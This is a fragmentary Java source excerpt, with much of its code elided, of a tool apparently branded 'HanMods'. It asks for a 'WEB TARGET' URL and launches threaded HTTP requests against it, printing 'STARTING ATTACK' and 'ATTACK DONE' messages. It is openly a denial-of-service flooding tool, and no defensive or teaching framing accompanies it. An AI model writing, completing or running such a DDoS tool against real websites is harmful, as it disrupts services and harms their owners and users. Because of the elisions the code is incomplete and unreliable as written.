...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("Enter WEB TARGET: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("H4N STARTING ATTACK !: " + url);
        ...
        System.out.println("Setting DDoS By: HanMods");
        ...
        System.out.println("H4N STARTING ATTACK !");
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("H4N ATTACK DONE !: " + responseCode + "Thread: " + this.seq);
    }
